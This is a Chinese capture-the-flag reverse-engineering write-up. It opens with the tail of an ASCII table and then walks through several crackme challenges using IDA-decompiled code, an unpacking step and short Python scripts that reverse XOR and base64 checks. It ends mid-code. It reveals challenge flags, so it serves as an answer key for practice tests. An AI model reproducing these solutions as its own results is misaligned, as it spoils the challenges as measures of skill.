text)</td><td>正文结束</td></tr><tr><td>0000 0100</td><td>04</td><td>4</td><td>0x04</td><td>EOT (end of transmission)</td><td>传输结束</td></tr><tr><td>0000 0101</td><td>05</td><td>5</td><td>0x05</td><td>ENQ (enquiry)</td><td>请求</td></tr><tr><td>0000 0110</td><td>06</td><td>6</td><td>0x06</td><td>ACK (acknowledge)</td><td>收到通知</td></tr><tr><td>0000 0111</td><td>07</td><td>7</td><td>0x07</td><td>BEL (bell)</td><td>响铃</td></tr><tr><td>0000 1000</td><td>010</td><td>8</td><td>0x08</td><td>BS (backspace)</td><td>退格</td></tr><tr><td>0000 1001</td><td>011</td><td>9</td><td>0x09</td><td>HT (horizontal tab)</td><td>水平制表符</td></tr><tr><td>0000 1010</td><td>012</td><td>10</td><td>0x0A</td><td>LF (NL line feed, new line)</td><td>换行键</td></tr><tr><td>0000 1011</td><td>013</td><td>11</td><td>0x0B</td><td>VT (vertical tab)</td><td>垂直制表符</td></tr><tr><td>0000 1100</td><td>014</td><td>12</td><td>0x0C</td><td>FF (NP form feed, new page)</td><td>换页键</td></tr><tr><td>0000 1101</td><td>015</td><td>13</td><td>0x0D</td><td>CR (carriage return)</td><td>回车键</td></tr><tr><td>0000 1110</td><td>016</td><td>14</td><td>0x0E</td><td>SO (shift out)</td><td>不用切换</td></tr><tr><td>0000 1111</td><td>017</td><td>15</td><td>0x0F</td><td>SI (shift in)</td><td>启用切换</td></tr><tr><td>0001 0000</td><td>020</td><td>16</td><td>0x10</td><td>DLE (data link escape)</td><td>数据链路转义</td></tr><tr><td>0001 0001</td><td>021</td><td>17</td><td>0x11</td><td>DC1 (device control 1)</td><td>设备控制1</td></tr><tr><td>0001 0010</td><td>022</td><td>18</td><td>0x12</td><td>DC2 (device control 2)</td><td>设备控制2</td></tr><tr><td>0001 0011</td><td>023</td><td>19</td><td>0x13</td><td>DC3 (device control 3)</td><td>设备控制3</td></tr><tr><td>0001 0100</td><td>024</td><td>20</td><td>0x14</td><td>DC4 (device control 4)</td><td>设备控制4</td></tr><tr><td>0001 0101</td><td>025</td><td>21</td><td>0x15</td><td>NAK (negative acknowledge)</td><td>拒绝接收</td></tr><tr><td>0001 0110</td><td>026</td><td>22</td><td>0x16</td><td>SYN (synchronous idle)</td><td>同步空闲</td></tr><tr><td>0001 0111</td><td>027</td><td>23</td><td>0x17</td><td>ETB (end of trans. block)</td><td>结束传输块</td></tr><tr><td>0001 1000</td><td>030</td><td>24</td><td>0x18</td><td>CAN (cancel)</td><td>取消</td></tr><tr><td>0001 1001</td><td>031</td><td>25</td><td>0x19</td><td>EM (end of medium)</td><td>媒介结束</td></tr><tr><td>0001 1010</td><td>032</td><td>26</td><td>0x1A</td><td>SUB (substitute)</td><td>代替</td></tr><tr><td>0001 1011</td><td>033</td><td>27</td><td>0x1B</td><td>ESC (escape)</td><td>换码(溢出)</td></tr><tr><td>0001 1100</td><td>034</td><td>28</td><td>0x1C</td><td>FS (file separator)</td><td>文件分隔符</td></tr><tr><td>0001 1101</td><td>035</td><td>29</td><td>0x1D</td><td>GS (group separator)</td><td>分组符</td></tr><tr><td>0001 1110</td><td>036</td><td>30</td><td>0x1E</td><td>RS (record separator)</td><td>记录分隔符</td></tr><tr><td>0001 1111</td><td>037</td><td>31</td><td>0x1F</td><td>US (unit separator)</td><td>单元分隔符</td></tr><tr><td>0010 0000</td><td>040</td><td>32</td><td>0x20</td><td>(space)</td><td>空格</td></tr><tr><td>0010 0001</td><td>041</td><td>33</td><td>0x21</td><td>!</td><td>叹号</td></tr><tr><td>0010 0010</td><td>042</td><td>34</td><td>0x22</td><td>“</td><td>双引号</td></tr><tr><td>0010 0011</td><td>043</td><td>35</td><td>0x23</td><td>#</td><td>井号</td></tr><tr><td>0010 0100</td><td>044</td><td>36</td><td>0x24</td><td>$</td><td>美元符</td></tr><tr><td>0010 0101</td><td>045</td><td>37</td><td>0x25</td><td>%</td><td>百分号</td></tr><tr><td>0010 0110</td><td>046</td><td>38</td><td>0x26</td><td>&amp;</td><td>和号</td></tr><tr><td>0010 0111</td><td>047</td><td>39</td><td>0x27</td><td>‘</td><td>闭单引号</td></tr><tr><td>0010 1000</td><td>050</td><td>40</td><td>0x28</td><td>(</td><td>开括号</td></tr><tr><td>0010 1001</td><td>051</td><td>41</td><td>0x29</td><td>)</td><td>闭括号</td></tr><tr><td>0010 1010</td><td>052</td><td>42</td><td>0x2A</td><td>*</td><td>星号</td></tr><tr><td>0010 1011</td><td>053</td><td>43</td><td>0x2B</td><td>+</td><td>加号</td></tr><tr><td>0010 1100</td><td>054</td><td>44</td><td>0x2C</td><td>,</td><td>逗号</td></tr><tr><td>0010 1101</td><td>055</td><td>45</td><td>0x2D</td><td>-</td><td>减号/破折号</td></tr><tr><td>0010 1110</td><td>056</td><td>46</td><td>0x2E</td><td>.</td><td>句号</td></tr><tr><td>0010 1111</td><td>057</td><td>47</td><td>0x2F</td><td>/</td><td>斜杠</td></tr><tr><td>0011 0000</td><td>060</td><td>48</td><td>0x30</td><td>0</td><td>字符0</td></tr><tr><td>0011 0001</td><td>061</td><td>49</td><td>0x31</td><td>1</td><td>字符1</td></tr><tr><td>0011 0010</td><td>062</td><td>50</td><td>0x32</td><td>2</td><td>字符2</td></tr><tr><td>0011 0011</td><td>063</td><td>51</td><td>0x33</td><td>3</td><td>字符3</td></tr><tr><td>0011 0100</td><td>064</td><td>52</td><td>0x34</td><td>4</td><td>字符4</td></tr><tr><td>0011 0101</td><td>065</td><td>53</td><td>0x35</td><td>5</td><td>字符5</td></tr><tr><td>0011 0110</td><td>066</td><td>54</td><td>0x36</td><td>6</td><td>字符6</td></tr><tr><td>0011 0111</td><td>067</td><td>55</td><td>0x37</td><td>7</td><td>字符7</td></tr><tr><td>0011 1000</td><td>070</td><td>56</td><td>0x38</td><td>8</td><td>字符8</td></tr><tr><td>0011 1001</td><td>071</td><td>57</td><td>0x39</td><td>9</td><td>字符9</td></tr><tr><td>0011 1010</td><td>072</td><td>58</td><td>0x3A</td><td>:</td><td>冒号</td></tr><tr><td>0011 1011</td><td>073</td><td>59</td><td>0x3B</td><td>;</td><td>分号</td></tr><tr><td>0011 1100</td><td>074</td><td>60</td><td>0x3C</td><td>&lt;</td><td>小于</td></tr><tr><td>0011 1101</td><td>075</td><td>61</td><td>0x3D</td><td>=</td><td>等号</td></tr><tr><td>0011 1110</td><td>076</td><td>62</td><td>0x3E</td><td>&gt;</td><td>大于</td></tr><tr><td>0011 1111</td><td>077</td><td>63</td><td>0x3F</td><td>?</td><td>问号</td></tr><tr><td>0100 0000</td><td>0100</td><td>64</td><td>0x40</td><td>@</td><td>电子邮件符号</td></tr><tr><td>0100 0001</td><td>0101</td><td>65</td><td>0x41</td><td>A</td><td>大写字母A</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td><td>大写字母B</td></tr><tr><td>0100 0011</td><td>0103</td><td>67</td><td>0x43</td><td>C</td><td>大写字母C</td></tr><tr><td>0100 0100</td><td>0104</td><td>68</td><td>0x44</td><td>D</td><td>大写字母D</td></tr><tr><td>0100 0101</td><td>0105</td><td>69</td><td>0x45</td><td>E</td><td>大写字母E</td></tr><tr><td>0100 0110</td><td>0106</td><td>70</td><td>0x46</td><td>F</td><td>大写字母F</td></tr><tr><td>0100 0111</td><td>0107</td><td>71</td><td>0x47</td><td>G</td><td>大写字母G</td></tr><tr><td>0100 1000</td><td>0110</td><td>72</td><td>0x48</td><td>H</td><td>大写字母H</td></tr><tr><td>0100 1001</td><td>0111</td><td>73</td><td>0x49</td><td>I</td><td>大写字母I</td></tr><tr><td>01001010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td><td>大写字母J</td></tr><tr><td>0100 1011</td><td>0113</td><td>75</td><td>0x4B</td><td>K</td><td>大写字母K</td></tr><tr><td>0100 1100</td><td>0114</td><td>76</td><td>0x4C</td><td>L</td><td>大写字母L</td></tr><tr><td>0100 1101</td><td>0115</td><td>77</td><td>0x4D</td><td>M</td><td>大写字母M</td></tr><tr><td>0100 1110</td><td>0116</td><td>78</td><td>0x4E</td><td>N</td><td>大写字母N</td></tr><tr><td>0100 1111</td><td>0117</td><td>79</td><td>0x4F</td><td>O</td><td>大写字母O</td></tr><tr><td>0101 0000</td><td>0120</td><td>80</td><td>0x50</td><td>P</td><td>大写字母P</td></tr><tr><td>0101 0001</td><td>0121</td><td>81</td><td>0x51</td><td>Q</td><td>大写字母Q</td></tr><tr><td>0101 0010</td><td>0122</td><td>82</td><td>0x52</td><td>R</td><td>大写字母R</td></tr><tr><td>0101 0011</td><td>0123</td><td>83</td><td>0x53</td><td>S</td><td>大写字母S</td></tr><tr><td>0101 0100</td><td>0124</td><td>84</td><td>0x54</td><td>T</td><td>大写字母T</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td><td>大写字母U</td></tr><tr><td>0101 0110</td><td>0126</td><td>86</td><td>0x56</td><td>V</td><td>大写字母V</td></tr><tr><td>0101 0111</td><td>0127</td><td>87</td><td>0x57</td><td>W</td><td>大写字母W</td></tr><tr><td>0101 1000</td><td>0130</td><td>88</td><td>0x58</td><td>X</td><td>大写字母X</td></tr><tr><td>0101 1001</td><td>0131</td><td>89</td><td>0x59</td><td>Y</td><td>大写字母Y</td></tr><tr><td>0101 1010</td><td>0132</td><td>90</td><td>0x5A</td><td>Z</td><td>大写字母Z</td></tr><tr><td>0101 1011</td><td>0133</td><td>91</td><td>0x5B</td><td>[</td><td>开方括号</td></tr><tr><td>0101 1100</td><td>0134</td><td>92</td><td>0x5C</td><td>\</td><td>反斜杠</td></tr><tr><td>0101 1101</td><td>0135</td><td>93</td><td>0x5D</td><td>]</td><td>闭方括号</td></tr><tr><td>0101 1110</td><td>0136</td><td>94</td><td>0x5E</td><td>^</td><td>脱字符</td></tr><tr><td>0101 1111</td><td>0137</td><td>95</td><td>0x5F</td><td>_</td><td>下划线</td></tr><tr><td>0110 0000</td><td>0140</td><td>96</td><td>0x60</td><td>`</td><td>开单引号</td></tr><tr><td>0110 0001</td><td>0141</td><td>97</td><td>0x61</td><td>a</td><td>小写字母a</td></tr><tr><td>0110 0010</td><td>0142</td><td>98</td><td>0x62</td><td>b</td><td>小写字母b</td></tr><tr><td>0110 0011</td><td>0143</td><td>99</td><td>0x63</td><td>c</td><td>小写字母c</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td><td>小写字母d</td></tr><tr><td>0110 0101</td><td>0145</td><td>101</td><td>0x65</td><td>e</td><td>小写字母e</td></tr><tr><td>0110 0110</td><td>0146</td><td>102</td><td>0x66</td><td>f</td><td>小写字母f</td></tr><tr><td>0110 0111</td><td>0147</td><td>103</td><td>0x67</td><td>g</td><td>小写字母g</td></tr><tr><td>0110 1000</td><td>0150</td><td>104</td><td>0x68</td><td>h</td><td>小写字母h</td></tr><tr><td>0110 1001</td><td>0151</td><td>105</td><td>0x69</td><td>i</td><td>小写字母i</td></tr><tr><td>0110 1010</td><td>0152</td><td>106</td><td>0x6A</td><td>j</td><td>小写字母j</td></tr><tr><td>0110 1011</td><td>0153</td><td>107</td><td>0x6B</td><td>k</td><td>小写字母k</td></tr><tr><td>0110 1100</td><td>0154</td><td>108</td><td>0x6C</td><td>l</td><td>小写字母l</td></tr><tr><td>0110 1101</td><td>0155</td><td>109</td><td>0x6D</td><td>m</td><td>小写字母m</td></tr><tr><td>0110 1110</td><td>0156</td><td>110</td><td>0x6E</td><td>n</td><td>小写字母n</td></tr><tr><td>0110 1111</td><td>0157</td><td>111</td><td>0x6F</td><td>o</td><td>小写字母o</td></tr><tr><td>0111 0000</td><td>0160</td><td>112</td><td>0x70</td><td>p</td><td>小写字母p</td></tr><tr><td>0111 0001</td><td>0161</td><td>113</td><td>0x71</td><td>q</td><td>小写字母q</td></tr><tr><td>0111 0010</td><td>0162</td><td>114</td><td>0x72</td><td>r</td><td>小写字母r</td></tr><tr><td>0111 0011</td><td>0163</td><td>115</td><td>0x73</td><td>s</td><td>小写字母s</td></tr><tr><td>0111 0100</td><td>0164</td><td>116</td><td>0x74</td><td>t</td><td>小写字母t</td></tr><tr><td>0111 0101</td><td>0165</td><td>117</td><td>0x75</td><td>u</td><td>小写字母u</td></tr><tr><td>0111 0110</td><td>0166</td><td>118</td><td>0x76</td><td>v</td><td>小写字母v</td></tr><tr><td>0111 0111</td><td>0167</td><td>119</td><td>0x77</td><td>w</td><td>小写字母w</td></tr><tr><td>0111 1000</td><td>0170</td><td>120</td><td>0x78</td><td>x</td><td>小写字母x</td></tr><tr><td>0111 1001</td><td>0171</td><td>121</td><td>0x79</td><td>y</td><td>小写字母y</td></tr><tr><td>0111 1010</td><td>0172</td><td>122</td><td>0x7A</td><td>z</td><td>小写字母z</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td><td>开花括号</td></tr><tr><td>0111 1100</td><td>0174</td><td>124</td><td>0x7C</td><td>|</td><td>垂线</td></tr><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td><td>闭花括号</td></tr><tr><td>0111 1110</td><td>0176</td><td>126</td><td>0x7E</td><td>~</td><td>波浪号</td></tr><tr><td>0111 1111</td><td>0177</td><td>127</td><td>0x7F</td><td>DEL (delete)</td><td>删除</td></tr></tbody></table><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p>直接拖进IDA中F5就出flag</p><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>搜索flag发现相应的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *v3; // rdi</span><br><span class="line">  __int64 i; // rcx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  char v7; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  int j; // [rsp+24h] [rbp+4h]</span><br><span class="line">  char Str1[224]; // [rsp+48h] [rbp+28h] BYREF</span><br><span class="line">  __int64 v10; // [rsp+128h] [rbp+108h]</span><br><span class="line"></span><br><span class="line">  v3 = &amp;v7;</span><br><span class="line">  for ( i = 82i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = -858993460;</span><br><span class="line">    v3 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = j;</span><br><span class="line">    if ( j &gt; j_strlen(Str2) )</span><br><span class="line">      break;</span><br><span class="line">    if ( Str2[j] == &#x27;o&#x27; )</span><br><span class="line">      Str2[j] = &#x27;0&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400111D1(&quot;input the flag:&quot;);</span><br><span class="line">  sub_14001128F(&quot;%20s&quot;, Str1);</span><br><span class="line">  v5 = j_strlen(Str2);</span><br><span class="line">  if ( !strncmp(Str1, Str2, v5) )</span><br><span class="line">    sub_1400111D1(&quot;this is the right flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_1400111D1(&quot;wrong flag\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到Str1与 Str2进行了比较，直接找Str2,发现flag,但是上面的for循环把o变成了0</p><h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h1><p>拖进IDA中F5：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int stat_loc; // [rsp+4h] [rbp-3Ch] BYREF</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  __pid_t pid; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char s2[24]; // [rsp+10h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  pid = fork();</span><br><span class="line">  if ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= strlen(&amp;flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;flag + i) == 105 || *(&amp;flag + i) == 114 )</span><br><span class="line">        *(&amp;flag + i) = 49;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;input the flag:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%20s&quot;, s2);</span><br><span class="line">  if ( !strcmp(&amp;flag, s2) )</span><br><span class="line">    return puts(&quot;this is the right flag!&quot;);</span><br><span class="line">  else</span><br><span class="line">    return puts(&quot;wrong flag!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到flag的位置，发现flag但是上面的程序将i，r变为了1</p><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><p>拖入OD，发现可疑的字符，dbapp{49d3c93df25caad81232130f3d2ebfad}，将其改为flag</p><h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>先拖进IDA发现文件有点异常，怀疑是加壳了，然后进行脱壳工作。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230827184532.png"></p><p>脱完壳之后得到以下程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char Str2[14]; // [esp+12h] [ebp-3Ah] BYREF</span><br><span class="line">  char Str1[44]; // [esp+20h] [ebp-2Ch] BYREF</span><br><span class="line"></span><br><span class="line">  sub_401910();</span><br><span class="line">  strcpy(Str2, &quot;HappyNewYear!&quot;);</span><br><span class="line">  *(_WORD *)Str1 = word_40306B;</span><br><span class="line">  memset(&amp;Str1[2], 0, 0x1Eu);</span><br><span class="line">  printf(&quot;please input the true flag:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, Str1);</span><br><span class="line">  if ( !strncmp(Str1, Str2, strlen(Str2)) )</span><br><span class="line">    return puts(aThisIsTrueFlag);</span><br><span class="line">  else</span><br><span class="line">    return puts(Buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个比较字符串的程序，得到flag：flag{HappyNewYear!}</p><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+2Ch] [rbp-124h]</span><br><span class="line">  char __b[264]; // [rsp+40h] [rbp-110h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(__b, 0, 0x100uLL);</span><br><span class="line">  printf(&quot;Input your flag:\n&quot;);</span><br><span class="line">  get_line(__b, 256LL);</span><br><span class="line">  if ( strlen(__b) != 33 )</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  for ( i = 1; i &lt; 33; ++i )</span><br><span class="line">    __b[i] ^= __b[i - 1];</span><br><span class="line">  if ( !strncmp(__b, global, 0x21uLL) )</span><br><span class="line">    printf(&quot;Success&quot;);</span><br><span class="line">  else</span><br><span class="line">LABEL_7:</span><br><span class="line">    printf(&quot;Failed&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑比较简单，就是后一项与前一项异或。</p><p>直接跟进global，然后保存16进制的数据，然后编写逆向脚本即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a= [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26,</span><br><span class="line">    0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D,</span><br><span class="line">    0x5A, 0x3B, 0x55, 0x11, </span><br><span class="line">    0x70, 0x19, 0x46, 0x1F, 0x76, 0x22,</span><br><span class="line">    0x4D, 0x23, 0x44, 0x0E, 0x67,</span><br><span class="line">    0x06, 0x68, 0x0F, 0x47, 0x32,0x4F]</span><br><span class="line"></span><br><span class="line">flag = &quot;f&quot;</span><br><span class="line">for i in range(1,len(a)):</span><br><span class="line">    flag += chr(a[i] ^ a[i-1])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h1><p>发现是个安卓文件，拖进JADX中查找flag即可得到flag</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230827192257.png"></p><h1 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  const char *v4; // eax</span><br><span class="line">  size_t v5; // eax</span><br><span class="line">  char v7; // [esp+0h] [ebp-188h]</span><br><span class="line">  char v8; // [esp+0h] [ebp-188h]</span><br><span class="line">  signed int j; // [esp+DCh] [ebp-ACh]</span><br><span class="line">  int i; // [esp+E8h] [ebp-A0h]</span><br><span class="line">  signed int v11; // [esp+E8h] [ebp-A0h]</span><br><span class="line">  char Destination[108]; // [esp+F4h] [ebp-94h] BYREF</span><br><span class="line">  char Str[28]; // [esp+160h] [ebp-28h] BYREF</span><br><span class="line">  char v14[8]; // [esp+17Ch] [ebp-Ch] BYREF</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    Destination[i] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_41132F(&quot;please enter the flag:&quot;, v7);</span><br><span class="line">  sub_411375(&quot;%20s&quot;, (char)Str);</span><br><span class="line">  v3 = j_strlen(Str);</span><br><span class="line">  v4 = (const char *)sub_4110BE(Str, v3, v14);      // 跟进此函数发现是个base64的编码函数</span><br><span class="line">  strncpy(Destination, v4, 0x28u);</span><br><span class="line">  v11 = j_strlen(Destination);</span><br><span class="line">  for ( j = 0; j &lt; v11; ++j )</span><br><span class="line">    Destination[j] += j;                           // 主要就是逆向这个！</span><br><span class="line">  v5 = j_strlen(Destination);</span><br><span class="line">  if ( !strncmp(Destination, Str2, v5) )</span><br><span class="line">    sub_41132F(&quot;rigth flag!\n&quot;, v8);</span><br><span class="line">  else</span><br><span class="line">    sub_41132F(&quot;wrong flag!\n&quot;, v8);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将输入的字符串base64加密之后再每一位减对应的数，编写逆向代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">data = &quot;e3nifIH9b_C@n@dH&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    flag += chr(ord(data[i]) - i)</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><h1 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v3[29]; // [esp+17h] [ebp-35h] BYREF</span><br><span class="line">  int v4; // [esp+34h] [ebp-18h]</span><br><span class="line">  int v5; // [esp+38h] [ebp-14h] BYREF</span><br><span class="line">  int i; // [esp+3Ch] [ebp-10h]</span><br><span class="line">  _BYTE v7[12]; // [esp+40h] [ebp-Ch] BYREF</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v3[26] = 0;</span><br><span class="line">  *(_WORD *)&amp;v3[27] = 0;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  strcpy(v3, &quot;*11110100001010000101111#&quot;);   // 赋值操作</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;you can choose one action to execute&quot;);</span><br><span class="line">    puts(&quot;1 up&quot;);</span><br><span class="line">    puts(&quot;2 down&quot;);</span><br><span class="line">    puts(&quot;3 left&quot;);</span><br><span class="line">    printf(&quot;4 right\n:&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">    if ( v5 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[25];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 == 3 